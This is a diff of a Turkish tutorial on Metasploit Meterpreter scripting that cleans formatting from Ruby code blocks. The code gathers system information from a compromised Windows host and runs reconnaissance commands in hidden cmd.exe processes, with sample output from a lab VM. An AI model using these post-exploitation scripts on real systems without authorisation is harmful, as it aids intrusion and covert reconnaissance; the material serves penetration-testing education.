@@ -26,7 +26,7 @@ Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca 
 
 
 ```bash
-root@kali:~# echo “print_status**(**“Hello World”**)**” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
 ```
 
 
@@ -46,8 +46,8 @@ Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise b
 
 
 ```bash
-print_error**(**“this is an error!”**)**
-print_line**(**“this is a line”**)**
+print_error(“this is an error!”)
+print_line(“this is a line”)
 ```
 
 
@@ -84,10 +84,10 @@ print_line("This is a line")
 
 
 ```bash
- def geninfo**(**session**)**
+ def geninfo(session)
     begin
     …..
-    rescue ::Exception **=>** e
+    rescue ::Exception => e
     …..
     end
  end
@@ -99,16 +99,16 @@ Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeter
 
 
 ```bash
- def getinfo**(**session**)**
+ def getinfo(session)
     begin
        sysnfo **=** session.sys.config.sysinfo
        runpriv **=** session.sys.config.getuid
-       print_status**(**"Getting system information ..."**)**
-       print_status**(**"tThe target machine OS is #{sysnfo['OS']}"**)**
-       print_status**(**"tThe computer name is #{'Computer'} "**)**
-       print_status**(**"tScript running as #{runpriv}"**)**
-    rescue ::Exception **=>** e
-       print_error**(**"The following error was encountered #{e}"**)**
+       print_status("Getting system information ...")
+       print_status("tThe target machine OS is #{sysnfo['OS']}")
+       print_status("tThe computer name is #{'Computer'} ")
+       print_status("tScript running as #{runpriv}")
+    rescue ::Exception => e
+       print_error("The following error was encountered #{e}")
     end
  end
 ```
@@ -127,20 +127,20 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 
 
 ```bash
- def getinfo**(**session**)**
+ def getinfo(session)
     begin
        sysnfo **=** session.sys.config.sysinfo
        runpriv **=** session.sys.config.getuid
-       print_status**(**"Getting system information ..."**)**
-       print_status**(**"tThe target machine OS is #{sysnfo['OS']}"**)**
-       print _status**(**"tThe computer name is #{'Computer'} "**)**
-       print_status**(**"tScript running as #{runpriv}"**)**
- rescue ::Exception **=>** e
-       print_error**(**"The following error was encountered #{e}"**)**
+       print_status("Getting system information ...")
+       print_status("tThe target machine OS is #{sysnfo['OS']}")
+       print _status("tThe computer name is #{'Computer'} ")
+       print_status("tScript running as #{runpriv}")
+ rescue ::Exception => e
+       print_error("The following error was encountered #{e}")
     end
  end
 
- getinfo**(**client**)**
+ getinfo(client)
 ```
 
 
@@ -151,7 +151,7 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 ```bash
  meterpreter > run helloworld2
  > Getting system information ...
- >     The target machine OS is Windows XP **(**Build 2600, Service Pack 3**)**.
+ >     The target machine OS is Windows XP (Build 2600, Service Pack 3).
  >     The computer name is Computer
  >     Script running as WINXPVM01labuser
 ```
@@ -170,25 +170,25 @@ Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir �
 
 
 ```bash
-def list_exec**(**session,cmdlst**)**
-    print_status**(**"Running Command List ..."**)**
+def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
     r**=**''
     session.response_timeout**=**120
     cmdlst.each **do** |cmd|
        begin
           print_status "running command #{cmd}"
-          r **=** session.sys.process.execute**(**"cmd.exe /c #{cmd}", nil, **{**'Hidden' **=>** true, 'Channelized' **=>** true**})**
-          **while****(**d **=** r.channel.read**)**             print_status**(**"t#{d}"**)**
+          r **=** session.sys.process.execute("cmd.exe /c #{cmd}", nil, **{**'Hidden' => true, 'Channelized' => true**})**
+          **while**(d **=** r.channel.read)             print_status("t#{d}")
           end
           r.channel.close
           r.close
-       rescue ::Exception **=>** e
-          print_error**(**"Error Running Command #{cmd}: #{e.class} #{e}"**)**
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
        end
     end
  end commands **=** **[** "set",
     "ipconfig  /all",
-    "arp -a"**]** list_exec**(**client,commands**)**
+    "arp -a"**]** list_exec(client,commands)
 ```
 
 
